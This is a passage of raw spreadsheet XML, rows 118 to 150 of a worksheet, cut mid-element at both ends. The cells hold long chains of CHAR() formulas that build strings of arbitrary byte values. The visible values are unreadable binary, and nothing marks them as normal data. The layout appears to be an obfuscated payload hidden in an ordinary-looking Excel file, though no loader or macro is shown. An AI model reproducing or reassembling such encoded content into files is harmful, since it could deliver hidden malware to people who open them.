)&amp;CHAR(84)&amp;CHAR(140)&amp;CHAR(110)&amp;CHAR(39)&amp;CHAR(45)&amp;CHAR(91)&amp;CHAR(81)&amp;CHAR(54)&amp;CHAR(248)&amp;CHAR(139)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(33)&amp;CHAR(53)&amp;CHAR(255)&amp;CHAR(139)&amp;CHAR(114)&amp;CHAR(44)&amp;CHAR(28)&amp;CHAR(142)&amp;CHAR(71)&amp;CHAR(33)&amp;CHAR(46)&amp;CHAR(139)&amp;CHAR(31)&amp;CHAR(10)&amp;CHAR(141)&amp;CHAR(204)&amp;CHAR(119)</f>
        <v>‰_x000B_ú\_x000E_ŽC&amp;_x0012_U†_x000E_öS_x000E_÷šµ_x000B__x0005__x0006_Š•B_x000E__x0005__x0003_€_x000F_H_x0007__x0001__x0006__x0002_SRYîù_x0003_	_x0007_†Õ_x000E_j	Ê_x0006_	WVýSEV\^R†À_x0007_ÁO"_x000B_À_x0002__x000F__x0006__x0003_
2ÁÅ_x0012__x0003_ŽI"_x0001_,F&amp;_x000D_ÎM&amp;_x0002_‘ûy/_x000D_Åé_x0013__x0002_	_x0005_[Žã_x0008_ÆTîg¦:_x0006__x0001__x0001_:ÎSšB_x000E_‚z
â"€Ëp&amp;öw_x001B_öp_x0010_ôw_x0014_ôs_x000B_Wý{_x000E_ë†ìþø‰5†É_x001E_ŽÏ‰D_x001D_ˆÆ|ÛÉRXÈŽB%_x001B_T‚q'_x0005__x001B_Ór_x0016_‰Í!ö‹Ð3_x000F_p_x001B_Bˆ_x0005__x000C_ŒØ†Ìwõ
¿
_x000C_¿Ç/Ê\Çˆê_x0013_T‰R"#9ÁTŒn'-[Q6ø‹F!!5ÿ‹r,_x001C_ŽG!.‹_x001F_
Ìw</v>
      </c>
      <c r="C118" t="str">
        <f>CHAR(86)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(126)&amp;CHAR(15)&amp;CHAR(49)&amp;CHAR(52)&amp;CHAR(117)&amp;CHAR(200)</f>
        <v>VÈ!¥~_x000F_14uÈ</v>
      </c>
    </row>
    <row r="119" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B119" t="str">
        <f>CHAR(28)&amp;CHAR(136)&amp;CHAR(245)&amp;CHAR(69)&amp;CHAR(117)&amp;CHAR(10)&amp;CHAR(138)&amp;CHAR(79)&amp;CHAR(59)&amp;CHAR(30)&amp;CHAR(65)&amp;CHAR(65)&amp;CHAR(136)&amp;CHAR(77)&amp;CHAR(35)&amp;CHAR(41)&amp;CHAR(250)&amp;CHAR(85)&amp;CHAR(104)&amp;CHAR(25)&amp;CHAR(82)&amp;CHAR(45)&amp;CHAR(206)&amp;CHAR(143)&amp;CHAR(113)&amp;CHAR(38)&amp;CHAR(17)&amp;CHAR(85)&amp;CHAR(10)&amp;CHAR(245)&amp;CHAR(105)&amp;CHAR(9)&amp;CHAR(83)&amp;CHAR(236)&amp;CHAR(246)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(133)&amp;CHAR(195)&amp;CHAR(11)&amp;CHAR(196)&amp;CHAR(8)&amp;CHAR(134)&amp;CHAR(128)&amp;CHAR(245)&amp;CHAR(13)&amp;CHAR(115)&amp;CHAR(38)&amp;CHAR(87)&amp;CHAR(142)&amp;CHAR(65)&amp;CHAR(41)&amp;CHAR(30)&amp;CHAR(86)&amp;CHAR(87)&amp;CHAR(234)&amp;CHAR(92)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(99)&amp;CHAR(18)&amp;CHAR(53)&amp;CHAR(208)&amp;CHAR(63)&amp;CHAR(239)&amp;CHAR(134)&amp;CHAR(65)&amp;CHAR(34)&amp;CHAR(37)&amp;CHAR(121)&amp;CHAR(2)&amp;CHAR(89)&amp;CHAR(237)&amp;CHAR(215)&amp;CHAR(12)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(134)&amp;CHAR(197)&amp;CHAR(30)&amp;CHAR(137)&amp;CHAR(71)&amp;CHAR(35)&amp;CHAR(38)&amp;CHAR(141)&amp;CHAR(117)&amp;CHAR(37)&amp;CHAR(25)&amp;CHAR(198)&amp;CHAR(229)&amp;CHAR(18)&amp;CHAR(68)&amp;CHAR(104)&amp;CHAR(25)&amp;CHAR(131)&amp;CHAR(66)&amp;CHAR(45)&amp;CHAR(38)&amp;CHAR(90)&amp;CHAR(139)&amp;CHAR(113)&amp;CHAR(33)&amp;CHAR(25)&amp;CHAR(129)&amp;CHAR(252)&amp;CHAR(25)&amp;CHAR(112)&amp;CHAR(17)&amp;CHAR(94)&amp;CHAR(143)&amp;CHAR(64)&amp;CHAR(47)&amp;CHAR(30)&amp;CHAR(84)&amp;CHAR(87)&amp;CHAR(234)&amp;CHAR(47)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(130)&amp;CHAR(197)&amp;CHAR(11)&amp;CHAR(49)&amp;CHAR(219)&amp;CHAR(54)&amp;CHAR(231)&amp;CHAR(53)&amp;CHAR(250)&amp;CHAR(140)&amp;CHAR(70)&amp;CHAR(38)&amp;CHAR(41)&amp;CHAR(136)&amp;CHAR(240)&amp;CHAR(6)&amp;CHAR(134)&amp;CHAR(97)&amp;CHAR(247)&amp;CHAR(243)&amp;CHAR(250)&amp;CHAR(84)&amp;CHAR(91)&amp;CHAR(141)&amp;CHAR(212)&amp;CHAR(152)&amp;CHAR(193)&amp;CHAR(84)&amp;CHAR(94)&amp;CHAR(128)&amp;CHAR(201)&amp;CHAR(31)&amp;CHAR(206)&amp;CHAR(134)&amp;CHAR(237)&amp;CHAR(22)&amp;CHAR(137)&amp;CHAR(71)&amp;CHAR(35)&amp;CHAR(18)&amp;CHAR(141)&amp;CHAR(85)&amp;CHAR(37)&amp;CHAR(21)&amp;CHAR(84)&amp;CHAR(80)&amp;CHAR(71)&amp;CHAR(137)&amp;CHAR(118)&amp;CHAR(45)&amp;CHAR(42)&amp;CHAR(53)&amp;CHAR(210)&amp;CHAR(85)&amp;CHAR(136)&amp;CHAR(126)&amp;CHAR(33)&amp;CHAR(21)&amp;CHAR(172)&amp;CHAR(167)&amp;CHAR(166)&amp;CHAR(172)&amp;CHAR(142)&amp;CHAR(72)&amp;CHAR(47)&amp;CHAR(22)&amp;CHAR(143)&amp;CHAR(127)&amp;CHAR(34)&amp;CHAR(27)&amp;CHAR(140)&amp;CHAR(110)&amp;CHAR(42)&amp;CHAR(30)&amp;CHAR(136)&amp;CHAR(118)&amp;CHAR(37)&amp;CHAR(17)&amp;CHAR(142)&amp;CHAR(78)&amp;CHAR(39)&amp;CHAR(45)&amp;CHAR(134)&amp;CHAR(200)&amp;CHAR(196)&amp;CHAR(207)&amp;CHAR(10)&amp;CHAR(137)&amp;CHAR(113)&amp;CHAR(41)&amp;CHAR(46)&amp;CHAR(10)&amp;CHAR(192)&amp;CHAR(199)&amp;CHAR(198)&amp;CHAR(4)&amp;CHAR(54)&amp;CHAR(204)&amp;CHAR(6)&amp;CHAR(241)&amp;CHAR(192)&amp;CHAR(209)&amp;CHAR(1)&amp;CHAR(58)&amp;CHAR(246)&amp;CHAR(194)&amp;CHAR(202)&amp;CHAR(8)&amp;CHAR(62)&amp;CHAR(213)&amp;CHAR(136)&amp;CHAR(106)&amp;CHAR(38)&amp;CHAR(43)&amp;CHAR(52)&amp;CHAR(244)&amp;CHAR(141)&amp;CHAR(232)&amp;CHAR(66)&amp;CHAR(138)&amp;CHAR(252)&amp;CHAR(30)&amp;CHAR(99)&amp;CHAR(212)&amp;CHAR(93)&amp;CHAR(87)&amp;CHAR(87)&amp;CHAR(93)&amp;CHAR(138)&amp;CHAR(198)&amp;CHAR(21)&amp;CHAR(193)&amp;CHAR(142)</f>
        <v>_x001C_ˆõEu
ŠO;_x001E_AAˆM#)úUh_x0019_R-Îq&amp;_x0011_U
õi	Sìö_x0003__x0004__x000B_…Ã_x000B_Ä_x0008_†€õ_x000D_s&amp;WŽA)_x001E_VWê\_x0005__x000D__x0006_c_x0012_5Ð?ï†A"%y_x0002_Yí×_x000C__x000B__x000D_†Å_x001E_‰G#&amp;u%_x0019_Æå_x0012_Dh_x0019_ƒB-&amp;Z‹q!_x0019_ü_x0019_p_x0011_^@/_x001E_TWê/_x0006__x0003_
‚Å_x000B_1Û6ç5úŒF&amp;)ˆð_x0006_†a÷óúT[Ô˜ÁT^€É_x001F_Î†í_x0016_‰G#_x0012_U%_x0015_TPG‰v-*5ÒUˆ~!_x0015_¬§¦¬ŽH/_x0016_"_x001B_Œn*_x001E_ˆv%_x0011_ŽN'-†ÈÄÏ
‰q).
ÀÇÆ_x0004_6Ì_x0006_ñÀÑ_x0001_:öÂÊ_x0008_&gt;Õˆj&amp;+4ôèBŠü_x001E_cÔ]WW]ŠÆ_x0015_ÁŽ</v>
      </c>
      <c r="C119" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(158)&amp;CHAR(135)&amp;CHAR(181)&amp;CHAR(189)&amp;CHAR(243)&amp;CHAR(224)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ž‡µ½óà!¥</v>
      </c>
    </row>
    <row r="120" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B120" t="str">
        <f>CHAR(81)&amp;CHAR(45)&amp;CHAR(18)&amp;CHAR(128)&amp;CHAR(229)&amp;CHAR(17)&amp;CHAR(87)&amp;CHAR(128)&amp;CHAR(94)&amp;CHAR(32)&amp;CHAR(47)&amp;CHAR(131)&amp;CHAR(213)&amp;CHAR(8)&amp;CHAR(134)&amp;CHAR(230)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(138)&amp;CHAR(69)&amp;CHAR(35)&amp;CHAR(34)&amp;CHAR(86)&amp;CHAR(54)&amp;CHAR(224)&amp;CHAR(67)&amp;CHAR(83)&amp;CHAR(138)&amp;CHAR(74)&amp;CHAR(13)&amp;CHAR(46)&amp;CHAR(229)&amp;CHAR(81)&amp;CHAR(128)&amp;CHAR(78)&amp;CHAR(34)&amp;CHAR(24)&amp;CHAR(133)&amp;CHAR(105)&amp;CHAR(47)&amp;CHAR(49)&amp;CHAR(141)&amp;CHAR(241)&amp;CHAR(158)&amp;CHAR(126)&amp;CHAR(45)&amp;CHAR(17)&amp;CHAR(48)&amp;CHAR(196)&amp;CHAR(174)&amp;CHAR(168)&amp;CHAR(160)&amp;CHAR(164)&amp;CHAR(141)&amp;CHAR(118)&amp;CHAR(39)&amp;CHAR(47)&amp;CHAR(129)&amp;CHAR(2)&amp;CHAR(143)&amp;CHAR(48)&amp;CHAR(77)&amp;CHAR(139)&amp;CHAR(17)&amp;CHAR(80)&amp;CHAR(129)&amp;CHAR(251)&amp;CHAR(13)&amp;CHAR(120)&amp;CHAR(245)&amp;CHAR(130)&amp;CHAR(118)&amp;CHAR(33)&amp;CHAR(34)&amp;CHAR(142)&amp;CHAR(65)&amp;CHAR(45)&amp;CHAR(30)&amp;CHAR(136)&amp;CHAR(117)&amp;CHAR(33)&amp;CHAR(28)&amp;CHAR(128)&amp;CHAR(78)&amp;CHAR(32)&amp;CHAR(31)&amp;CHAR(193)&amp;CHAR(67)&amp;CHAR(35)&amp;CHAR(50)&amp;CHAR(30)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(206)&amp;CHAR(4)&amp;CHAR(196)&amp;CHAR(194)&amp;CHAR(194)&amp;CHAR(8)&amp;CHAR(53)&amp;CHAR(252)&amp;CHAR(198)&amp;CHAR(196)&amp;CHAR(10)&amp;CHAR(54)&amp;CHAR(253)&amp;CHAR(199)&amp;CHAR(200)&amp;CHAR(18)&amp;CHAR(5)&amp;CHAR(207)&amp;CHAR(15)&amp;CHAR(203)&amp;CHAR(202)&amp;CHAR(194)&amp;CHAR(1)&amp;CHAR(192)&amp;CHAR(213)&amp;CHAR(15)&amp;CHAR(58)&amp;CHAR(253)&amp;CHAR(48)&amp;CHAR(252)&amp;CHAR(202)&amp;CHAR(205)&amp;CHAR(21)&amp;CHAR(130)&amp;CHAR(106)&amp;CHAR(38)&amp;CHAR(51)&amp;CHAR(6)&amp;CHAR(127)&amp;CHAR(209)&amp;CHAR(138)&amp;CHAR(109)&amp;CHAR(45)&amp;CHAR(47)&amp;CHAR(140)&amp;CHAR(93)&amp;CHAR(38)&amp;CHAR(22)&amp;CHAR(58)&amp;CHAR(195)&amp;CHAR(143)&amp;CHAR(125)&amp;CHAR(38)&amp;CHAR(37)&amp;CHAR(139)&amp;CHAR(121)&amp;CHAR(33)&amp;CHAR(17)&amp;CHAR(139)&amp;CHAR(71)&amp;CHAR(45)&amp;CHAR(25)&amp;CHAR(143)&amp;CHAR(79)&amp;CHAR(143)&amp;CHAR(4)&amp;CHAR(58)&amp;CHAR(66)&amp;CHAR(139)&amp;CHAR(19)&amp;CHAR(67)&amp;CHAR(141)&amp;CHAR(255)&amp;CHAR(7)&amp;CHAR(120)&amp;CHAR(243)&amp;CHAR(138)&amp;CHAR(107)&amp;CHAR(38)&amp;CHAR(55)&amp;CHAR(142)&amp;CHAR(199)&amp;CHAR(108)&amp;CHAR(21)&amp;CHAR(95)&amp;CHAR(57)&amp;CHAR(210)&amp;CHAR(10)&amp;CHAR(74)&amp;CHAR(206)&amp;CHAR(140)&amp;CHAR(203)&amp;CHAR(120)&amp;CHAR(17)&amp;CHAR(129)&amp;CHAR(121)&amp;CHAR(47)&amp;CHAR(17)&amp;CHAR(141)&amp;CHAR(242)&amp;CHAR(56)&amp;CHAR(249)&amp;CHAR(130)&amp;CHAR(236)&amp;CHAR(137)&amp;CHAR(9)&amp;CHAR(60)&amp;CHAR(61)&amp;CHAR(3)&amp;CHAR(71)&amp;CHAR(133)&amp;CHAR(239)&amp;CHAR(2)&amp;CHAR(114)&amp;CHAR(255)&amp;CHAR(141)&amp;CHAR(109)&amp;CHAR(37)&amp;CHAR(61)&amp;CHAR(44)&amp;CHAR(212)&amp;CHAR(18)&amp;CHAR(219)&amp;CHAR(137)&amp;CHAR(69)&amp;CHAR(46)&amp;CHAR(22)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(119)&amp;CHAR(13)&amp;CHAR(76)&amp;CHAR(132)&amp;CHAR(6)&amp;CHAR(42)&amp;CHAR(140)&amp;CHAR(197)&amp;CHAR(123)&amp;CHAR(248)&amp;CHAR(137)&amp;CHAR(64)&amp;CHAR(47)&amp;CHAR(42)&amp;CHAR(130)&amp;CHAR(213)&amp;CHAR(13)&amp;CHAR(139)&amp;CHAR(52)&amp;CHAR(252)&amp;CHAR(245)&amp;CHAR(254)&amp;CHAR(94)&amp;CHAR(89)&amp;CHAR(95)&amp;CHAR(88)&amp;CHAR(134)&amp;CHAR(201)&amp;CHAR(18)</f>
        <v>Q-_x0012_€å_x0011_W€^ /ƒÕ_x0008_†æ_x0006__x0003_
ŠE#"V6àCSŠJ_x000D_.åQ€N"_x0018_…i/1ñž~-_x0011_0Ä®¨ ¤v'/_x0002_0M‹_x0011_Pû_x000D_xõ‚v!"ŽA-_x001E_ˆu!_x001C_€N _x001F_ÁC#2_x001E__x0006__x0003_
_x0002_Î_x0004_ÄÂÂ_x0008_5üÆÄ
6ýÇÈ_x0012__x0005_Ï_x000F_ËÊÂ_x0001_ÀÕ_x000F_:ý0üÊÍ_x0015_‚j&amp;3_x0006_ÑŠm-/Œ]&amp;_x0016_:Ã}&amp;%‹y!_x0011_‹G-_x0019_O_x0004_:B‹_x0013_Cÿ_x0007_xóŠk&amp;7ŽÇl_x0015__9Ò
JÎŒËx_x0011_y/_x0011_ò8ù‚ì‰	&lt;=_x0003_G…ï_x0002_rÿm%=,Ô_x0012_Û‰E._x0016_‰_x0003__x0004_w_x000D_L„_x0006_*ŒÅ{ø‰@/*‚Õ_x000D_‹4üõþ^Y_X†É_x0012_</v>
      </c>
      <c r="C120" t="str">
        <f>CHAR(251)&amp;CHAR(135)&amp;CHAR(191)&amp;CHAR(112)&amp;CHAR(254)&amp;CHAR(201)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(158)&amp;CHAR(135)</f>
        <v>û‡¿pþÉ!¥ž‡</v>
      </c>
    </row>
    <row r="121" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B121" t="str">
        <f>CHAR(198)&amp;CHAR(140)&amp;CHAR(86)&amp;CHAR(38)&amp;CHAR(9)&amp;CHAR(134)&amp;CHAR(66)&amp;CHAR(45)&amp;CHAR(6)&amp;CHAR(80)&amp;CHAR(131)&amp;CHAR(252)&amp;CHAR(128)&amp;CHAR(217)&amp;CHAR(113)&amp;CHAR(21)&amp;CHAR(86)&amp;CHAR(152)&amp;CHAR(126)&amp;CHAR(45)&amp;CHAR(21)&amp;CHAR(40)&amp;CHAR(245)&amp;CHAR(129)&amp;CHAR(1)&amp;CHAR(50)&amp;CHAR(137)&amp;CHAR(8)&amp;CHAR(68)&amp;CHAR(128)&amp;CHAR(237)&amp;CHAR(11)&amp;CHAR(115)&amp;CHAR(244)&amp;CHAR(94)&amp;CHAR(87)&amp;CHAR(196)&amp;CHAR(143)&amp;CHAR(85)&amp;CHAR(38)&amp;CHAR(10)&amp;CHAR(130)&amp;CHAR(70)&amp;CHAR(34)&amp;CHAR(5)&amp;CHAR(85)&amp;CHAR(142)&amp;CHAR(126)&amp;CHAR(33)&amp;CHAR(13)&amp;CHAR(250)&amp;CHAR(168)&amp;CHAR(136)&amp;CHAR(77)&amp;CHAR(33)&amp;CHAR(12)&amp;CHAR(84)&amp;CHAR(193)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(90)&amp;CHAR(233)</f>
        <v>ÆŒV&amp;	†B-_x0006_Pƒü€Ùq_x0015_V˜~-_x0015_(õ_x0001_2‰_x0008_D€í_x000B_sô^WÄU&amp;
‚F"_x0005_UŽ~!_x000D_ú¨ˆM!_x000C_TÁ_x0004__x000B__x0006__x0007__x0007__x0002__x000E__x0006__x0003_
_x0001__x0001__x0007__x0002__x0003__x0005__x000D__x0006__x0005__x0007__x0002__x0002__x0005_Zé</v>
      </c>
      <c r="C121" t="str">
        <f>CHAR(181)&amp;CHAR(141)&amp;CHAR(243)&amp;CHAR(224)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(48)&amp;CHAR(105)&amp;CHAR(249)</f>
        <v>µóà!¥û0iù</v>
      </c>
    </row>
    <row r="122" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B122" t="s">
        <v>0</v>
      </c>
      <c r="C122" t="str">
        <f>CHAR(179)&amp;CHAR(128)&amp;CHAR(170)&amp;CHAR(161)&amp;CHAR(222)&amp;CHAR(231)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(128)</f>
        <v>³€ª¡Þç&gt;±Ö€</v>
      </c>
    </row>
    <row r="123" spans="2:3" x14ac:dyDescent="0.25">
      <c r="C123" t="str">
        <f>CHAR(36)&amp;CHAR(61)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(249)&amp;CHAR(93)&amp;CHAR(200)&amp;CHAR(105)&amp;CHAR(46)</f>
        <v>$=ûÏ&gt;ù]Èi.</v>
      </c>
    </row>
    <row r="124" spans="2:3" x14ac:dyDescent="0.25">
      <c r="C124" t="str">
        <f>CHAR(251)&amp;CHAR(130)&amp;CHAR(15)&amp;CHAR(120)&amp;CHAR(179)&amp;CHAR(132)&amp;CHAR(170)&amp;CHAR(161)&amp;CHAR(222)&amp;CHAR(231)</f>
        <v>û‚_x000F_x³„ª¡Þç</v>
      </c>
    </row>
    <row r="125" spans="2:3" x14ac:dyDescent="0.25">
      <c r="C125" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(129)&amp;CHAR(160)&amp;CHAR(101)&amp;CHAR(227)&amp;CHAR(206)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±Ö eãÎ&gt;±</v>
      </c>
    </row>
    <row r="126" spans="2:3" x14ac:dyDescent="0.25">
      <c r="C126" t="str">
        <f>CHAR(155)&amp;CHAR(67)&amp;CHAR(33)&amp;CHAR(192)&amp;CHAR(179)&amp;CHAR(68)&amp;CHAR(42)&amp;CHAR(148)&amp;CHAR(254)&amp;CHAR(200)</f>
        <v>›C!À³D*”þÈ</v>
      </c>
    </row>
    <row r="127" spans="2:3" x14ac:dyDescent="0.25">
      <c r="C127" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(179)&amp;CHAR(78)&amp;CHAR(252)&amp;CHAR(153)&amp;CHAR(215)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(192)</f>
        <v>!¥³Nü™×È!À</v>
      </c>
    </row>
    <row r="128" spans="2:3" x14ac:dyDescent="0.25">
      <c r="C128" t="str">
        <f>CHAR(179)&amp;CHAR(68)&amp;CHAR(50)&amp;CHAR(148)&amp;CHAR(254)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(179)&amp;CHAR(78)</f>
        <v>³D2”þÈ!¥³N</v>
      </c>
    </row>
    <row r="129" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C129" t="str">
        <f>CHAR(255)&amp;CHAR(41)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(237)&amp;CHAR(112)&amp;CHAR(198)&amp;CHAR(193)&amp;CHAR(33)</f>
        <v>ÿ)ÖÈ!ípÆÁ!</v>
      </c>
    </row>
    <row r="130" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C130" t="str">
        <f>CHAR(254)&amp;CHAR(201)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(158)&amp;CHAR(135)&amp;CHAR(181)&amp;CHAR(133)&amp;CHAR(243)&amp;CHAR(224)</f>
        <v>þÉ!¥ž‡µ…óà</v>
      </c>
    </row>
    <row r="131" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C131" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(153)&amp;CHAR(119)&amp;CHAR(56)&amp;CHAR(38)&amp;CHAR(128)&amp;CHAR(172)&amp;CHAR(176)</f>
        <v>!¥û™w8&amp;€¬°</v>
      </c>
    </row>
    <row r="132" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C132" t="str">
        <f>CHAR(195)&amp;CHAR(205)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(158)&amp;CHAR(69)&amp;CHAR(44)&amp;CHAR(175)&amp;CHAR(249)&amp;CHAR(207)</f>
        <v>ÃÍ&gt;±žE,¯ùÏ</v>
      </c>
    </row>
    <row r="133" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C133" t="str">
        <f>CHAR(62)&amp;CHAR(89)&amp;CHAR(206)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(162)&amp;CHAR(117)&amp;CHAR(62)&amp;CHAR(178)</f>
        <v>&gt;YÎÈ!¥¢u&gt;²</v>
      </c>
    </row>
    <row r="134" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C134" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(96)&amp;CHAR(29)&amp;CHAR(251)&amp;CHAR(143)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(41)&amp;CHAR(24)</f>
        <v>ÖÈ`_x001D_û&gt;±)_x0018_</v>
      </c>
    </row>
    <row r="135" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C135" t="str">
        <f>CHAR(105)&amp;CHAR(38)&amp;CHAR(63)&amp;CHAR(183)&amp;CHAR(253)&amp;CHAR(249)&amp;CHAR(85)&amp;CHAR(12)&amp;CHAR(89)&amp;CHAR(102)</f>
        <v>i&amp;?·ýùU_x000C_Yf</v>
      </c>
    </row>
    <row r="136" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C136" t="str">
        <f>CHAR(179)&amp;CHAR(78)&amp;CHAR(210)&amp;CHAR(217)&amp;CHAR(215)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(237)&amp;CHAR(114)&amp;CHAR(147)</f>
        <v>³NÒÙ×È!ír“</v>
      </c>
    </row>
    <row r="137" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C137" t="str">
        <f>CHAR(26)&amp;CHAR(153)&amp;CHAR(158)&amp;CHAR(65)&amp;CHAR(77)&amp;CHAR(129)&amp;CHAR(203)&amp;CHAR(135)&amp;CHAR(183)&amp;CHAR(205)</f>
        <v>_x001A_™žAMË‡·Í</v>
      </c>
    </row>
    <row r="138" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C138" t="str">
        <f>CHAR(242)&amp;CHAR(240)&amp;CHAR(105)&amp;CHAR(44)&amp;CHAR(143)&amp;CHAR(235)&amp;CHAR(126)&amp;CHAR(253)&amp;CHAR(95)&amp;CHAR(172)</f>
        <v>òði,ë~ý_¬</v>
      </c>
    </row>
    <row r="139" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C139" t="str">
        <f>CHAR(5)&amp;CHAR(237)&amp;CHAR(183)&amp;CHAR(70)&amp;CHAR(82)&amp;CHAR(149)&amp;CHAR(134)&amp;CHAR(132)&amp;CHAR(168)&amp;CHAR(209)</f>
        <v>_x0005_í·FR•†„¨Ñ</v>
      </c>
    </row>
    <row r="140" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C140" t="str">
        <f>CHAR(223)&amp;CHAR(151)&amp;CHAR(114)&amp;CHAR(56)&amp;CHAR(170)&amp;CHAR(236)&amp;CHAR(65)&amp;CHAR(192)&amp;CHAR(183)&amp;CHAR(68)</f>
        <v>ß—r8ªìAÀ·D</v>
      </c>
    </row>
    <row r="141" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C141" t="str">
        <f>CHAR(34)&amp;CHAR(148)&amp;CHAR(182)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(182)&amp;CHAR(68)&amp;CHAR(101)&amp;CHAR(169)</f>
        <v>"”¶È!¥¶De©</v>
      </c>
    </row>
    <row r="142" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C142" t="str">
        <f>CHAR(155)&amp;CHAR(69)&amp;CHAR(122)&amp;CHAR(181)&amp;CHAR(182)&amp;CHAR(70)&amp;CHAR(225)&amp;CHAR(252)&amp;CHAR(93)&amp;CHAR(211)</f>
        <v>›Ezµ¶Fáü]Ó</v>
      </c>
    </row>
    <row r="143" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C143" t="str">
        <f>CHAR(221)&amp;CHAR(236)&amp;CHAR(112)&amp;CHAR(180)&amp;CHAR(94)&amp;CHAR(249)&amp;CHAR(95)&amp;CHAR(6)&amp;CHAR(141)&amp;CHAR(33)</f>
        <v>Ýìp´^ù__x0006_!</v>
      </c>
    </row>
    <row r="144" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C144" t="str">
        <f>CHAR(59)&amp;CHAR(187)&amp;CHAR(24)&amp;CHAR(59)&amp;CHAR(241)&amp;CHAR(72)&amp;CHAR(221)&amp;CHAR(196)&amp;CHAR(135)&amp;CHAR(204)</f>
        <v>;»_x0018_;ñHÝÄ‡Ì</v>
      </c>
    </row>
    <row r="145" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C145" t="str">
        <f>CHAR(190)&amp;CHAR(93)&amp;CHAR(246)&amp;CHAR(240)&amp;CHAR(229)&amp;CHAR(208)&amp;CHAR(243)&amp;CHAR(135)&amp;CHAR(193)&amp;CHAR(118)</f>
        <v>¾]öðåÐó‡Áv</v>
      </c>
    </row>
    <row r="146" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C146" t="str">
        <f>CHAR(158)&amp;CHAR(55)&amp;CHAR(230)&amp;CHAR(78)&amp;CHAR(30)&amp;CHAR(130)&amp;CHAR(181)&amp;CHAR(170)&amp;CHAR(155)&amp;CHAR(241)</f>
        <v>ž7æN_x001E_‚µª›ñ</v>
      </c>
    </row>
    <row r="147" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C147" t="str">
        <f>CHAR(218)&amp;CHAR(208)&amp;CHAR(45)&amp;CHAR(135)&amp;CHAR(15)&amp;CHAR(113)&amp;CHAR(63)&amp;CHAR(115)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>ÚÐ-‡_x000F_q?s!¥</v>
      </c>
    </row>
    <row r="148" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C148" t="str">
        <f>CHAR(251)&amp;CHAR(134)&amp;CHAR(181)&amp;CHAR(234)&amp;CHAR(230)&amp;CHAR(140)&amp;CHAR(170)&amp;CHAR(198)&amp;CHAR(199)&amp;CHAR(134)</f>
        <v>û†µêæŒªÆÇ†</v>
      </c>
    </row>
    <row r="149" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C149" t="str">
        <f>CHAR(63)&amp;CHAR(109)&amp;CHAR(159)&amp;CHAR(73)&amp;CHAR(229)&amp;CHAR(45)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(244)</f>
        <v>?mŸIå-ûÏ&gt;ô</v>
      </c>
    </row>
    <row r="150" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C150" t="str">
